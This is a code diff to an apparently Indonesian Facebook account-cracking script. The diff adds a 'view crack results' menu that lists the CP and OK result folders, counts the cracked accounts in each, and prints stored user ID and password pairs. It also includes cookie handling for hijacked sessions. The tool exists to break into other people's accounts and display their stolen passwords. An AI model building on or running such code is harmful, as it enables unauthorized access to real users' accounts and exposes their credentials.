@@ -1159,17 +1159,20 @@ def menu():
     console.print(Columns(dia))
     prints(Panel(f"""{P2}[{color_text}01{P2}]. crack dari id publik
 [{color_text}02{P2}]. crack dari id Masal
-[{color_text}03{P2}]. Logout [[bold red]hapus cookie[bold white]]
-[{color_text}04{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
+[{color_text}03{P2}]. Lihat Hasil Crack
+[{color_text}04{P2}]. Logout [[bold red]hapus cookie[bold white]]
+[{color_text}05{P2}]. {M2}EXIT{P2}""",width=60,title="MENU",style=f"{color_panel}"))
     HaHi = console.input(f" {H2}• {P2}pilih menu : ")
     if HaHi in ["1", "01"]:
         dump_publik()
     elif HaHi in ["2", "02"]:
         massal()
     elif HaHi in ["3", "03"]:
+        result()
+    elif HaHi in ["4", "04"]:
         os.system('rm -rf .fancookie.txt');os.system('rm -rf .fantoken.txt')
         console.print(f" {H2}• {P2}Berhasil Hapus Cookie")
-    elif HaHi in ["4", "04"]:
+    elif HaHi in ["5", "05"]:
         exit()
     else:
     	console.print(f" {H2}• {P2}[bold red]Masukan Yang Bener Tolol!!! btw fanky ganteng ")
@@ -1281,6 +1284,67 @@ def massal():
         time.sleep(3)
         exit()
 
+def result():
+    console.print(Panel(f"""
+{P2}[{color_text}01{P2}]. Lihat Hasil {K2}CP{P2}
+{P2}[{color_text}02{P2}]. Lihat Hasil {H2}OK{P2}
+""", width=60, title=f"Hasil Crack", style=color_panel))
+
+    fankycek = console.input(f" {H2}• {P2}Masukan : ")
+
+    if fankycek in ["1", "01"]:
+        lihat_hasil("CP", f"{H2}• {P2}Anda Tidak Memiliki Hasil CP", "bold yellow")
+    elif fankycek in ["2", "02"]:
+        lihat_hasil("OK", f"{H2}• {P2}Anda Tidak Mempunyai File OK", "bold green")
+    else:
+        console.print(f" {H2}• {P2}Pilih Yang Bener Bang")
+        exit()
+
+def lihat_hasil(folder, pesan_tidak_ada, warna_akun):
+    try:
+        files = os.listdir(folder)
+        if not files:
+            console.print(pesan_tidak_ada)
+            time.sleep(3)
+            exit()
+    except FileNotFoundError:
+        console.print(f" {H2}• {P2}File Tidak Di Temukan ")
+        time.sleep(3)
+        exit()
+
+    file_map = {}
+    for idx, file in enumerate(files, start=1):
+        try:
+            jumlah = len(open(f"{folder}/{file}", "r").readlines())
+        except:
+            continue
+        num = f"{idx:02}"
+        file_map[str(idx)] = file
+        file_map[num] = file
+        console.print(Panel(f"{P2}[{color_text}{num}{P2}] {file} {K2}{jumlah} Account", width=60, style=color_panel))
+
+    pilih_file(file_map, folder, warna_akun)
+
+def pilih_file(file_map, folder, warna_akun):
+    pilihan = console.input(f" {H2}• {P2}Masukan : ")
+
+    if pilihan not in file_map:
+        console.print(f" {H2}• {P2}Pilih Yang Bener Atuhh")
+        exit()
+
+    try:
+        lines = open(f"{folder}/{file_map[pilihan]}", "r").read().splitlines()
+    except:
+        console.print(f" {H2}• {P2}File Tidak Di Temukan ")
+        time.sleep(3)
+        exit()
+
+    for line in lines:
+        user, password = line.split("|")
+        console.print(Panel(f"{warna_akun} ID : {user} PASSWORD : {password}", width=60, style=warna_akun))
+
+    console.input(f" {H2}• {P2}[ {M2}Klik Enter For Exit {P2}]")
+    exit()
 def convert(cookie):
     cok = "fr=%s;datr=%s;c_user=%s;xs=%s" % (
         cookie["fr"],
